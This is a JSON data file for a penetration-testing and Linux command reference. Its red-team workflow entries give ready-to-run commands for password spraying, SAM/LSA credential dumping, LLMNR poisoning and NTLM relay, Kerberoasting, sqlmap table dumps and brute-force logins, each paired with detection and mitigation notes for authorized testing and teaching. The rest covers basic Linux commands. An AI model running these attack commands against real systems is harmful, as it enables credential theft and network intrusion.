 {"id":"tool-macchanger","cat":"Tools","title":"macchanger","desc":"View and spoof (randomize) a network interface's MAC address.","url":"https://www.kali.org/tools/macchanger/","license":"open source","platforms":["linux"],"tags":["wireless","network","tools"],"install":{"linux":"sudo apt install macchanger"}},
 {"id":"tool-responder","cat":"Tools","title":"Responder","desc":"LLMNR/NBT-NS/MDNS poisoner that captures NetNTLM hashes; includes relay tooling.","url":"https://www.kali.org/tools/responder/","license":"open source","platforms":["linux"],"tags":["exploitation","network","active-directory","tools"],"install":{"linux":"sudo apt install responder"}},
 {"id":"tool-kerbrute","cat":"Tools","title":"kerbrute","desc":"Fast Kerberos pre-auth username enumeration and password spraying.","url":"https://www.kali.org/tools/kerbrute/","license":"open source","platforms":["linux"],"tags":["password","active-directory","tools"],"install":{"linux":"sudo apt install kerbrute"}},
 {"id":"tool-smbclient","cat":"Tools","title":"smbclient","desc":"FTP-like client for accessing SMB/CIFS shares (part of Samba).","url":"https://www.samba.org/","license":"open source","platforms":["linux"],"tags":["smb","enumeration","network","tools"],"install":{"linux":"sudo apt install smbclient"}},
 {"id":"tool-rpcclient","cat":"Tools","title":"rpcclient","desc":"MS-RPC client for enumerating Windows/Samba (users, groups, shares) over RPC.","url":"https://www.samba.org/","license":"open source","platforms":["linux"],"tags":["smb","enumeration","active-directory","tools"],"install":{"linux":"sudo apt install smbclient"}},
 {"id":"tool-tshark","cat":"Tools","title":"tshark (Wireshark CLI)","desc":"Command-line network protocol analyzer - capture and dissect packets like Wireshark.","url":"https://www.wireshark.org/","license":"open source","platforms":["linux"],"tags":["network","tools"],"install":{"linux":"sudo apt install tshark"}},
 {"id":"tool-netcat","cat":"Tools","title":"netcat (nc)","desc":"The TCP/IP swiss-army knife: connect, listen, transfer data, and port-probe.","url":"https://www.kali.org/tools/netcat/","license":"open source","platforms":["linux"],"tags":["network","tools"],"install":{"linux":"sudo apt install netcat-traditional"}},
 {"id":"tool-seclists","cat":"Tools","title":"SecLists","desc":"Curated collection of wordlists: usernames, passwords, fuzzing payloads, discovery lists.","url":"https://www.kali.org/tools/seclists/","license":"open source","platforms":["linux"],"tags":["password","web","reference","tools"],"install":{"linux":"sudo apt install seclists"}},
 {"id":"wf-nmap","cat":"Reconnaissance","team":"red","title":"Nmap - full recon workflow","desc":"End-to-end host discovery -> port sweep -> deep service/version -> NSE vuln scan.","danger":"Authorized targets only; port/NSE scanning is intrusive and logged.","tags":["recon","network","scanning"],"attack":["T1046"],"detect":"Sequential connections across many ports/hosts, SYN scans, and NSE probe signatures in IDS/flow logs.","mitigate":"Minimize exposed services, rate-limit, and alert on scan patterns; use host firewalls.","code":{"linux":"# 1) discover live hosts\nnmap -sn {{CIDR:10.0.0.0/24}} -oG live.txt\n# 2) fast top-ports sweep of live hosts\nnmap -T4 --top-ports 1000 -iL <(awk '/Up$/{print $2}' live.txt) -oA top\n# 3) deep service/version + default scripts, all ports\nnmap -sC -sV -p- {{TARGET:10.0.0.5}} -oA full\n# 4) targeted NSE vuln scripts\nnmap --script vuln -p {{PORTS:80,443,445}} {{TARGET:10.0.0.5}} -oN vuln.txt"},"related":["recon-nmap-sweep","recon-nmap-top","recon-nmap-vuln","recon-host-discovery"]},
 {"id":"wf-sqlmap","cat":"Web App Testing","team":"red","title":"sqlmap - SQL injection workflow","desc":"Detect injection, enumerate the DBMS and databases, then dump a target table.","danger":"Intrusive; can modify/exfiltrate data. Authorized testing only.","tags":["web","exploitation"],"attack":["T1190"],"detect":"SQL errors/time-delays, tautologies, and UNION payloads in web/DB logs; sqlmap User-Agent.","mitigate":"Parameterized queries, least-privilege DB accounts, input validation, and a WAF.","code":{"linux":"# save the request from your proxy to req.txt first\n# 1) detect injection\nsqlmap -r req.txt --batch --level 3 --risk 2\n# 2) enumerate databases\nsqlmap -r req.txt --batch --dbs\n# 3) list tables in a DB\nsqlmap -r req.txt --batch -D {{DB:appdb}} --tables\n# 4) dump a table\nsqlmap -r req.txt --batch -D {{DB:appdb}} -T {{TABLE:users}} --dump"},"related":["web-sqlmap","web-commix"]},
 {"id":"wf-hashcat","cat":"Password Auditing","team":"red","title":"hashcat - cracking workflow","desc":"Identify the hash, then escalate from dictionary to rules to mask, and show results.","danger":"Crack only hashes you are authorized to audit.","tags":["password"],"attack":["T1110.002"],"detect":"Offline - no target signal. Detect the upstream theft (LSASS/SAM/NTDS dump) that produced the hashes.","mitigate":"Long unique passphrases, slow salted hashes, MFA; monitor for credential-dumping upstream.","code":{"linux":"# 1) identify the hash -> hashcat mode number\nhashid '{{HASH:$1$abc$...}}'\n# 2) straight dictionary\nhashcat -m {{MODE:1000}} hashes.txt /usr/share/wordlists/rockyou.txt\n# 3) wordlist + rules\nhashcat -m {{MODE:1000}} hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n# 4) mask brute force (8 chars, any)\nhashcat -m {{MODE:1000}} hashes.txt -a 3 '?a?a?a?a?a?a?a?a'\n# 5) show cracked\nhashcat -m {{MODE:1000}} hashes.txt --show"},"related":["pw-hashid","pw-hashcat-modes","pw-hashcat-rules","pw-hashcat-mask"]},
 {"id":"wf-netexec","cat":"Active Directory Attacks","team":"red","title":"NetExec (nxc) - SMB/AD sweep workflow","desc":"Validate creds across hosts, enumerate shares/users/policy, then dump SAM & LSA where local admin.","danger":"Authorized engagements only; spraying can trigger account lockouts.","tags":["active-directory","smb","password"],"attack":["T1110.003"],"detect":"Type-3 logon bursts across many hosts from one source (4624/4625), SMB share enumeration, remote SAM/LSA access.","mitigate":"SMB signing, LAPS, tiered admin, lockout policy, and cross-host authentication alerting.","code":{"linux":"# 1) auth check / spray across a subnet (Pwn3d! = local admin)\nnxc smb {{CIDR:10.0.0.0/24}} -u {{USER:svc}} -p '{{PASS:Winter2025!}}'\n# 2) enumerate shares\nnxc smb {{TARGET:10.0.0.5}} -u {{USER}} -p '{{PASS}}' --shares\n# 3) domain users + password policy from the DC\nnxc smb {{DC:10.0.0.10}} -u {{USER}} -p '{{PASS}}' --users --pass-pol\n# 4) dump SAM/LSA where admin\nnxc smb {{TARGET:10.0.0.5}} -u {{USER}} -p '{{PASS}}' --sam --lsa"},"related":["adx-spray-netexec","recon-smb-shares","pw-secretsdump"]},
 {"id":"wf-responder","cat":"Post-Exploitation","team":"red","title":"Responder - LLMNR/NBT-NS poisoning workflow","desc":"Poison broadcast name resolution to capture NetNTLM hashes, then crack or relay them.","danger":"Intercepts other users' authentication. Authorized, isolated testing only.","tags":["active-directory","network","password"],"attack":["T1557.001"],"detect":"Rogue answers to LLMNR/NBT-NS/mDNS, multiple names resolving to one host, and auth to an unexpected server.","mitigate":"Disable LLMNR/NBT-NS/mDNS, enforce SMB signing, segment the network, and alert on name-service poisoning.","code":{"linux":"# 1) poison and capture (hashes saved under /usr/share/responder/logs/)\nsudo responder -I {{IFACE:eth0}} -wv\n# 2) crack captured NetNTLMv2 (hashcat mode 5600)\nhashcat -m 5600 /usr/share/responder/logs/{{LOGFILE:SMB-NTLMv2-SSP-10.0.0.5.txt}} /usr/share/wordlists/rockyou.txt\n# 3) OR relay instead of crack (disable SMB/HTTP in /etc/responder/Responder.conf first)\nimpacket-ntlmrelayx -tf targets.txt -smb2support"},"related":["pw-hashcat-netntlmv2","post-pass-the-hash-ticket"]},
 {"id":"wf-content-discovery","cat":"Web App Testing","team":"red","title":"Web content discovery workflow (gobuster/ffuf/feroxbuster)","desc":"Sweep directories, go recursive, fuzz parameters, then hunt virtual hosts.","danger":"Authorized targets only; brute-forcing generates heavy traffic.","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"High-volume requests iterating a wordlist against one host; bursts of 404/403.","mitigate":"Rate-limiting, WAF, and monitoring for content-discovery patterns.","code":{"linux":"# 1) quick directory sweep\ngobuster dir -u https://{{TARGET:example.com}} -w /usr/share/seclists/Discovery/Web-Content/common.txt\n# 2) recursive discovery\nferoxbuster -u https://{{TARGET:example.com}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n# 3) fuzz paths/values\nffuf -u 'https://{{TARGET:example.com}}/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,204,301,302,307,401,403\n# 4) virtual-host discovery\nffuf -u https://{{TARGET:example.com}} -H 'Host: FUZZ.{{TARGET:example.com}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"},"related":["web-gobuster-dir","web-feroxbuster","web-ffuf-param","web-ffuf-dir"]},
 {"id":"wf-wpscan","cat":"Web App Testing","team":"red","title":"WPScan - WordPress workflow","desc":"Enumerate plugins/themes/users, then password-guess a discovered account.","danger":"Authorized targets only.","tags":["web","enumeration"],"attack":["T1595.002"],"detect":"WPScan User-Agent, /wp-json/ user enumeration, and xmlrpc/login brute traffic.","mitigate":"Limit login attempts, disable XML-RPC/user enumeration, keep plugins patched, and use a WAF.","code":{"linux":"# 1) enumerate (add --api-token for vuln data)\nwpscan --url https://{{TARGET:example.com}} -e ap,at,u --plugins-detection aggressive\n# 2) password-guess a user\nwpscan --url https://{{TARGET:example.com}} -U {{USER:admin}} -P /usr/share/wordlists/rockyou.txt"},"related":["web-wpscan","recon-wpscan"]},
 {"id":"wf-hydra","cat":"Password Auditing","team":"red","title":"Hydra - login brute-force workflow","desc":"Online credential guessing against network services and web login forms.","danger":"Can lock out accounts and is very noisy. Authorized testing only.","tags":["password","network"],"attack":["T1110.001"],"detect":"Many failed authentications from one source (4625 / SSH auth.log), and account lockouts.","mitigate":"MFA, lockout/backoff, fail2ban, and source-based alerting on auth failures.","code":{"linux":"# SSH\nhydra -l {{USER:root}} -P /usr/share/wordlists/rockyou.txt ssh://{{TARGET:10.0.0.5}}\n# HTTP POST login form (tune the failure string F=)\nhydra -L users.txt -P rockyou.txt {{TARGET:10.0.0.5}} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"},"related":["pw-hydra-ssh","pw-hydra-http","pw-medusa"]},
 {"id":"wf-evil-winrm","cat":"Post-Exploitation","team":"red","title":"evil-winrm - post-exploitation workflow","desc":"Connect over WinRM (password or hash), enumerate privileges, and move tools/loot.","danger":"Authorized access only; creates remote-service logons and process activity.","tags":["post-ex","remote","active-directory"],"attack":["T1021.006"],"detect":"WinRM logons (4624 type 3 to WSMan), wsmprovhost.exe children, and 5985/5986 traffic.","mitigate":"Restrict WinRM to admin hosts, require TLS, monitor 4624/wsmprovhost, and enforce least privilege.","code":{"linux":"# 1) connect (password, or -H <NTLM> for pass-the-hash)\nevil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:administrator}} -p '{{PASS:Password1}}'\n# in-session:\n*Evil-WinRM* PS> whoami /all\n*Evil-WinRM* PS> upload /opt/PrivescCheck.ps1\n*Evil-WinRM* PS> download C:\\\\Users\\\\admin\\\\Desktop\\\\loot.txt ./loot.txt"},"related":["post-evil-winrm","post-pass-the-hash-ticket","pe-winpeas"]},
 {"id":"wf-smb-access","cat":"Reconnaissance","team":"red","title":"SMB access & enumeration workflow (smbclient/smbmap/rpcclient)","desc":"List and browse shares, then RID-cycle users over RPC via a null or authed session.","danger":"Authorized targets only.","tags":["smb","enumeration","network"],"attack":["T1135"],"detect":"Anonymous/null-session logons (4624 type 3), share and user enumeration over SMB/RPC.","mitigate":"Disable null sessions, restrict SMB and RestrictAnonymous, least-privilege shares, and monitor anonymous access.","code":{"linux":"# 1) list shares (null session or creds)\nsmbclient -L //{{TARGET:10.0.0.5}}/ -N\nsmbmap -H {{TARGET:10.0.0.5}} -u {{USER:guest}} -p ''\n# 2) connect to a share\nsmbclient //{{TARGET:10.0.0.5}}/{{SHARE:Data}} -U {{USER:guest}}\n# 3) RID-cycle domain users over RPC\nrpcclient -U '' -N {{TARGET:10.0.0.5}} -c 'enumdomusers'"},"related":["recon-smb-shares","recon-smb-enum","adx-null-session-rid"]},
 {"id":"wf-kerberos-roast","cat":"Active Directory Attacks","team":"red","title":"Kerberos roasting workflow (kerbrute + roasting)","desc":"Enumerate valid users, AS-REP roast no-preauth accounts, Kerberoast SPNs, then crack.","danger":"Authorized engagements only; roasting touches the DC and is logged.","tags":["active-directory","password"],"attack":["T1558.003"],"detect":"Mass TGS-REQ / RC4 tickets (4769), AS-REQ without pre-auth (4768), and username-spray bursts.","mitigate":"Strong service-account passwords or gMSA, disable RC4, require pre-auth, and alert on mass 4769.","code":{"linux":"# 1) enumerate valid usernames (no lockout)\nkerbrute userenum -d {{DOMAIN:corp.local}} --dc {{DC:10.0.0.10}} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt\n# 2) AS-REP roast (no-preauth users)\nimpacket-GetNPUsers {{DOMAIN}}/ -dc-ip {{DC}} -usersfile users.txt -no-pass -format hashcat\n# 3) Kerberoast SPN accounts (needs any valid creds)\nimpacket-GetUserSPNs {{DOMAIN}}/{{USER:svc}}:'{{PASS:pass}}' -dc-ip {{DC}} -request -outputfile spns.txt\n# 4) crack (AS-REP m=18200, TGS m=13100)\nhashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt"},"related":["adx-kerbrute-userenum","adx-asrep-impacket","adx-kerberoast-impacket","adx-spn-discover"]},
 {"id":"wf-nuclei","cat":"Web App Testing","team":"red","title":"Nuclei - templated scanning workflow","desc":"Update templates, run a scoped scan, then narrow by severity/tags and scale to a host list.","danger":"Authorized targets only; templates send active probes.","tags":["web","detection"],"attack":["T1595.002"],"detect":"Bursts of templated requests with known payloads; Nuclei User-Agent in web logs.","mitigate":"Patch exposed services, WAF, and alert on known-CVE probe signatures.","code":{"linux":"# 1) update templates\nnuclei -update-templates\n# 2) scoped scan of one target\nnuclei -u https://{{TARGET:example.com}}\n# 3) narrow by severity/tags\nnuclei -u https://{{TARGET:example.com}} -severity critical,high -tags cve,exposure\n# 4) scale to a host list (rate-limited)\nnuclei -l hosts.txt -rl 50 -o findings.txt"},"related":["web-nuclei","web-httpx"]},
 {"id":"lx-pwd","cat":"Linux Essentials","title":"pwd - print the current directory","desc":"Show the full path of the folder you're currently in.","tags":["linux","reference","teaching"],"code":{"linux":"pwd            # where am I?"}},
 {"id":"lx-ls","cat":"Linux Essentials","title":"ls - list directory contents","desc":"List files and folders, optionally with details.","tags":["linux","reference","teaching"],"code":{"linux":"ls\nls -lah        # long list, all files, human sizes\nls -lt         # newest first"}},
 {"id":"lx-cd","cat":"Linux Essentials","title":"cd - change directory","desc":"Move between folders in the shell.","tags":["linux","reference","teaching"],"code":{"linux":"cd {{DIR:/etc}}\ncd ..          # up one level\ncd ~           # your home\ncd -           # previous directory"}},
 {"id":"lx-mkdir","cat":"Linux Essentials","title":"mkdir - make directories","desc":"Create one or more new folders.","tags":["linux","reference","teaching"],"code":{"linux":"mkdir {{DIR:project}}\nmkdir -p a/b/c   # create parent folders as needed"}},
 {"id":"lx-rmdir","cat":"Linux Essentials","title":"rmdir - remove empty directories","desc":"Delete folders that are already empty.","tags":["linux","reference","teaching"],"code":{"linux":"rmdir {{DIR:olddir}}   # for non-empty dirs use: rm -r"}},
 {"id":"lx-rm","cat":"Linux Essentials","title":"rm - remove files and directories","desc":"Delete files or folders (permanently - no recycle bin).","tags":["linux","reference","teaching"],"code":{"linux":"rm {{FILE:file.txt}}\nrm -r {{DIR:folder}}     # recursive\nrm -i *.log             # ask before each"},"danger":"Deletions are permanent. `rm -rf` cannot be undone - double-check the path."},
 {"id":"lx-cp","cat":"Linux Essentials","title":"cp - copy files and directories","desc":"Copy files or whole folders to a new location.","tags":["linux","reference","teaching"],"code":{"linux":"cp {{SRC:a.txt}} {{DST:b.txt}}\ncp -r {{SRC:dir}} {{DST:backup}}   # recursive\ncp -a src/. dest/                 # preserve attributes"}},
 {"id":"lx-mv","cat":"Linux Essentials","title":"mv - move or rename","desc":"Move files into another folder, or rename them.","tags":["linux","reference","teaching"],"code":{"linux":"mv {{SRC:old.txt}} {{DST:new.txt}}   # rename\nmv *.jpg {{DIR:images/}}             # move into a folder"}},
 {"id":"lx-touch","cat":"Linux Essentials","title":"touch - create a file / update its timestamp","desc":"Make an empty file, or bump a file's modified time.","tags":["linux","reference","teaching"],"code":{"linux":"touch {{FILE:notes.txt}}\ntouch -d '2025-01-01' {{FILE:notes.txt}}"}},
 {"id":"lx-ln","cat":"Linux Essentials","title":"ln - create links (shortcuts)","desc":"Make a symbolic link that points to another file or folder.","tags":["linux","reference","teaching"],"code":{"linux":"ln -s {{TARGET:/opt/app/bin}} {{LINK:app}}   # symlink\nreadlink -f {{LINK:app}}                     # resolve it"}},
 {"id":"lx-find","cat":"Linux Essentials","title":"find - search for files and directories","desc":"Search a folder tree by name, type, size, or age.","tags":["linux","reference","teaching"],"code":{"linux":"find {{DIR:.}} -name '*.log'\nfind . -type f -mtime -1     # changed in last day\nfind . -size +100M           # larger than 100 MB"}},
 {"id":"lx-locate","cat":"Linux Essentials","title":"locate - fast filename search","desc":"Instantly find files by name using a prebuilt index.","tags":["linux","reference","teaching"],"code":{"linux":"sudo updatedb          # refresh the index\nlocate {{NAME:sshd_config}}"}},
 {"id":"lx-stat","cat":"Linux Essentials","title":"stat - detailed file information","desc":"Show a file's size, permissions, owner, and timestamps.","tags":["linux","reference","teaching"],"code":{"linux":"stat {{FILE:file.txt}}"}},
 {"id":"lx-file","cat":"Linux Essentials","title":"file - identify a file's type","desc":"Tell what a file actually is, regardless of its extension.","tags":["linux","reference","teaching"],"code":{"linux":"file {{FILE:mystery.bin}}"}},
 {"id":"lx-tree","cat":"Linux Essentials","title":"tree - show a directory as a tree","desc":"Visualise nested folders and files as an indented tree.","tags":["linux","reference","teaching"],"code":{"linux":"tree {{DIR:.}}\ntree -L 2      # limit depth to 2 levels"}},
 {"id":"lx-cat","cat":"Linux Essentials","title":"cat - print or join files","desc":"Print a file to the screen, or concatenate several files.","tags":["linux","reference","teaching"],"code":{"linux":"cat {{FILE:file.txt}}\ncat a.txt b.txt > combined.txt"}},
 {"id":"lx-less","cat":"Linux Essentials","title":"less - scroll through a file","desc":"Page through a large file interactively.","tags":["linux","reference","teaching"],"code":{"linux":"less {{FILE:bigfile.log}}   # q quit, / search, G end, g start"}},
 {"id":"lx-head","cat":"Linux Essentials","title":"head - first lines of a file","desc":"Show the beginning of a file (10 lines by default).","tags":["linux","reference","teaching"],"code":{"linux":"head {{FILE:file.txt}}\nhead -n 20 {{FILE:file.txt}}"}},
 {"id":"lx-tail","cat":"Linux Essentials","title":"tail - last lines / follow a file","desc":"Show the end of a file, or watch it update live.","tags":["linux","reference","teaching"],"code":{"linux":"tail {{FILE:file.txt}}\ntail -n 50 {{FILE:file.log}}\ntail -f /var/log/syslog     # live follow"}},
 {"id":"lx-wc","cat":"Linux Essentials","title":"wc - count lines, words, and bytes","desc":"Count how many lines, words, or characters a file has.","tags":["linux","reference","teaching"],"code":{"linux":"wc -l {{FILE:file.txt}}   # lines\nwc -w {{FILE:file.txt}}   # words"}},
 {"id":"lx-echo","cat":"Linux Essentials","title":"echo - print text or variables","desc":"Output text or the value of a variable.","tags":["linux","reference","teaching"],"code":{"linux":"echo \"Hello\"\necho \"Home is $HOME\"\necho -n \"no newline\""}},
 {"id":"lx-tee","cat":"Linux Essentials","title":"tee - write to a file and the screen","desc":"Save command output to a file while still showing it.","tags":["linux","reference","teaching"],"code":{"linux":"echo hi | tee {{FILE:out.txt}}\n{{CMD:some-command}} | tee -a log.txt   # append"}},
 {"id":"lx-xargs","cat":"Linux Essentials","title":"xargs - build commands from input","desc":"Turn a list of items into arguments for another command.","tags":["linux","reference","teaching"],"code":{"linux":"find . -name '*.tmp' | xargs rm -f\necho a b c | xargs -n1 echo"}},
 {"id":"lx-chmod","cat":"Linux Essentials","title":"chmod - change file permissions","desc":"Set who can read, write, or run a file.","tags":["linux","reference","teaching"],"code":{"linux":"chmod +x {{FILE:script.sh}}   # make executable\nchmod 644 {{FILE:file}}       # rw-r--r--\nchmod -R 750 {{DIR:dir}}"}},
 {"id":"lx-chown","cat":"Linux Essentials","title":"chown - change file owner","desc":"Change which user (and group) owns a file.","tags":["linux","reference","teaching"],"code":{"linux":"sudo chown {{USER:alice}} {{FILE:file}}\nsudo chown alice:staff {{FILE:file}}\nsudo chown -R alice {{DIR:dir}}"}},
 {"id":"lx-chgrp","cat":"Linux Essentials","title":"chgrp - change a file's group","desc":"Change the group that owns a file.","tags":["linux","reference","teaching"],"code":{"linux":"sudo chgrp {{GROUP:developers}} {{FILE:file}}"}},
 {"id":"lx-umask","cat":"Linux Essentials","title":"umask - default permissions for new files","desc":"Control the permissions newly created files get.","tags":["linux","reference","teaching"],"code":{"linux":"umask          # show current mask\numask 027      # new files not world-readable"}},
 {"id":"lx-useradd","cat":"Linux Essentials","title":"useradd - create a user account","desc":"Add a new local user (create home dir and set a shell).","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo useradd -m -s /bin/bash {{USER:alice}}\nsudo passwd {{USER:alice}}"},"danger":"Creates a system account. Run as root/sudo."},
 {"id":"lx-usermod","cat":"Linux Essentials","title":"usermod - modify a user account","desc":"Change an existing user: groups, shell, name, or lock state.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo usermod -aG {{GROUP:sudo}} {{USER:alice}}   # add to a group (-a keeps existing groups!)\nsudo usermod -s /bin/zsh {{USER:alice}}          # change login shell\nsudo usermod -L {{USER:alice}}                   # lock the account"},"danger":"Omitting -a with -G replaces all of a user's groups. Run as root/sudo."},
 {"id":"lx-userdel","cat":"Linux Essentials","title":"userdel - delete a user account","desc":"Remove a local user, optionally with their home folder.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo userdel {{USER:alice}}\nsudo userdel -r {{USER:alice}}   # also delete home dir + mail"},"danger":"Permanently removes the account (and files with -r)."},
 {"id":"lx-passwd","cat":"Linux Essentials","title":"passwd - change a password","desc":"Set or change your own or another user's password.","tags":["linux","reference","teaching","account"],"code":{"linux":"passwd                   # change your own\nsudo passwd {{USER:alice}}   # change another user's"}},
 {"id":"lx-groupadd","cat":"Linux Essentials","title":"groupadd - create a group","desc":"Add a new local group.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo groupadd {{GROUP:developers}}"}},
 {"id":"lx-groupmod","cat":"Linux Essentials","title":"groupmod - modify a group","desc":"Rename a group or change its GID.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo groupmod -n {{NEW:devs}} {{OLD:developers}}   # rename"}},
 {"id":"lx-groupdel","cat":"Linux Essentials","title":"groupdel - delete a group","desc":"Remove a local group.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo groupdel {{GROUP:developers}}"}},
 {"id":"lx-id","cat":"Linux Essentials","title":"id - show user and group IDs","desc":"Print the UID, GID, and groups for you or another user.","tags":["linux","reference","teaching","account"],"code":{"linux":"id\nid {{USER:alice}}"}},
 {"id":"lx-whoami","cat":"Linux Essentials","title":"whoami - print the current user","desc":"Show which user you're currently running as.","tags":["linux","reference","teaching","account"],"code":{"linux":"whoami"}},
 {"id":"lx-who","cat":"Linux Essentials","title":"who / w - who is logged in","desc":"List users currently logged into the system.","tags":["linux","reference","teaching","account"],"code":{"linux":"who\nw          # who + what each is doing"}},
 {"id":"lx-su","cat":"Linux Essentials","title":"su - switch user","desc":"Become another user (or root) in a new shell.","tags":["linux","reference","teaching","account"],"code":{"linux":"su - {{USER:alice}}   # login shell as another user\nsu -            # become root (needs root's password)"}},
 {"id":"lx-sudo","cat":"Linux Essentials","title":"sudo - run a command as another user","desc":"Run a single command with elevated (root) privileges.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo {{CMD:apt update}}\nsudo -i               # open a root shell\nsudo -l               # list what you're allowed to run"}},
 {"id":"lx-chage","cat":"Linux Essentials","title":"chage - password aging","desc":"View or set password expiry / aging for an account.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo chage -l {{USER:alice}}     # list aging info\nsudo chage -M 90 {{USER:alice}}   # max age 90 days"}},
 {"id":"lx-groups","cat":"Linux Essentials","title":"groups - show a user's groups","desc":"List the groups a user belongs to.","tags":["linux","reference","teaching","account"],"code":{"linux":"groups\ngroups {{USER:alice}}"}},
 {"id":"lx-last","cat":"Linux Essentials","title":"last - recent login history","desc":"Show recent logins from the system records.","tags":["linux","reference","teaching","account"],"code":{"linux":"last\nlast {{USER:alice}}"}},
 {"id":"lx-ps","cat":"Linux Essentials","title":"ps - list processes","desc":"Show running processes and their PIDs.","tags":["linux","reference","teaching","process"],"code":{"linux":"ps aux                 # all processes\nps -ef                 # full format\nps aux | grep {{NAME:nginx}}"}},
 {"id":"lx-top","cat":"Linux Essentials","title":"top - live process monitor","desc":"Watch processes, CPU, and memory update in real time.","tags":["linux","reference","teaching","process"],"code":{"linux":"top          # q quit, P sort by CPU, M by memory\nhtop         # friendlier UI if installed"}},
 {"id":"lx-kill","cat":"Linux Essentials","title":"kill - signal or stop a process","desc":"Send a signal (usually to stop) a process by PID.","tags":["linux","reference","teaching","process"],"code":{"linux":"kill {{PID:1234}}\nkill -9 {{PID:1234}}    # force kill\nkill -l                # list signal names"},"danger":"-9 force-kills without cleanup. Verify the PID first."},
 {"id":"lx-killall","cat":"Linux Essentials","title":"killall - kill processes by name","desc":"Stop every process matching a program name.","tags":["linux","reference","teaching","process"],"code":{"linux":"killall {{NAME:firefox}}"},"danger":"Stops ALL matching processes at once."},
 {"id":"lx-pkill","cat":"Linux Essentials","title":"pkill / pgrep - match processes by pattern","desc":"Find or kill processes by name/pattern.","tags":["linux","reference","teaching","process"],"code":{"linux":"pgrep -a {{NAME:ssh}}    # find matching\npkill {{NAME:ssh}}       # kill matching"},"danger":"pkill can match more than you expect - check with pgrep first."},
 {"id":"lx-jobs","cat":"Linux Essentials","title":"jobs / bg / fg - background job control","desc":"Manage commands running in the current shell.","tags":["linux","reference","teaching","process"],"code":{"linux":"jobs        # list this shell's jobs\nbg %1       # resume job 1 in background\nfg %1       # bring job 1 to foreground   (Ctrl+Z suspends)"}},
 {"id":"lx-nice","cat":"Linux Essentials","title":"nice / renice - set process priority","desc":"Start or adjust how much CPU a process may take.","tags":["linux","reference","teaching","process"],"code":{"linux":"nice -n 10 {{CMD:big-job}}       # start at lower priority\nrenice -n 5 -p {{PID:1234}}      # change a running process"}},
 {"id":"lx-nohup","cat":"Linux Essentials","title":"nohup - keep running after logout","desc":"Run a command that survives closing the terminal.","tags":["linux","reference","teaching","process"],"code":{"linux":"nohup {{CMD:./long-task.sh}} &\n# output is written to nohup.out"}},
 {"id":"lx-uname","cat":"Linux Essentials","title":"uname - kernel / system info","desc":"Print the kernel and system architecture details.","tags":["linux","reference","teaching"],"code":{"linux":"uname -a       # everything\nuname -r       # kernel version"}},
 {"id":"lx-hostname","cat":"Linux Essentials","title":"hostname - show or set the hostname","desc":"Display (or change) the computer's name.","tags":["linux","reference","teaching"],"code":{"linux":"hostname\nhostnamectl              # detailed view (systemd)"}},
 {"id":"lx-uptime","cat":"Linux Essentials","title":"uptime - how long the system has run","desc":"Show boot time, uptime, and load averages.","tags":["linux","reference","teaching"],"code":{"linux":"uptime"}},
 {"id":"lx-date","cat":"Linux Essentials","title":"date - show or format the date/time","desc":"Print the current date/time, or format it.","tags":["linux","reference","teaching"],"code":{"linux":"date\ndate '+%Y-%m-%d %H:%M:%S'\ndate -u          # UTC"}},
 {"id":"lx-cal","cat":"Linux Essentials","title":"cal - show a calendar","desc":"Print a month or year calendar.","tags":["linux","reference","teaching"],"code":{"linux":"cal\ncal 2025"}},
 {"id":"lx-free","cat":"Linux Essentials","title":"free - memory usage","desc":"See how much RAM and swap are used and free.","tags":["linux","reference","teaching","memory"],"code":{"linux":"free -h       # human readable"}},
 {"id":"lx-df","cat":"Linux Essentials","title":"df - disk space by filesystem","desc":"Show free and used space on mounted filesystems.","tags":["linux","reference","teaching"],"code":{"linux":"df -h"}},
 {"id":"lx-du","cat":"Linux Essentials","title":"du - disk usage of files/folders","desc":"Measure how much space files or folders take up.","tags":["linux","reference","teaching"],"code":{"linux":"du -sh {{DIR:.}}                  # total for a folder\ndu -h --max-depth=1 | sort -h    # biggest subfolders"}},
 {"id":"lx-lsblk","cat":"Linux Essentials","title":"lsblk - list disks and partitions","desc":"List block devices (disks, partitions) as a tree.","tags":["linux","reference","teaching"],"code":{"linux":"lsblk\nlsblk -f      # with filesystem/UUID info"}},
 {"id":"lx-shutdown","cat":"Linux Essentials","title":"shutdown / reboot - power control","desc":"Power off or restart the machine.","tags":["linux","reference","teaching"],"code":{"linux":"sudo shutdown -h now     # halt now\nsudo shutdown -r +5      # reboot in 5 minutes\nsudo reboot"},"danger":"Ends all sessions. Warn other users first."},
 {"id":"lx-env","cat":"Linux Essentials","title":"env / export - environment variables","desc":"View environment variables or set one for your session.","tags":["linux","reference","teaching"],"code":{"linux":"env                          # list all\nexport {{VAR:API_KEY}}={{VAL:secret}}\necho \"${{VAR:API_KEY}}\""}},
 {"id":"lx-alias","cat":"Linux Essentials","title":"alias - create command shortcuts","desc":"Make a short name for a longer command.","tags":["linux","reference","teaching"],"code":{"linux":"alias ll='ls -lah'\nalias           # list current aliases   (add to ~/.bashrc to keep)"}},
 {"id":"lx-history","cat":"Linux Essentials","title":"history - command history","desc":"See and reuse commands you've run before.","tags":["linux","reference","teaching"],"code":{"linux":"history\nhistory | grep {{TERM:ssh}}\n!{{NUM:42}}       # re-run history line 42"}},
 {"id":"lx-which","cat":"Linux Essentials","title":"which / type - locate a command","desc":"Find where a command lives, or what it resolves to.","tags":["linux","reference","teaching"],"code":{"linux":"which {{CMD:python3}}\ntype {{CMD:ll}}          # alias / builtin / file?\nwhereis {{CMD:ls}}"}},
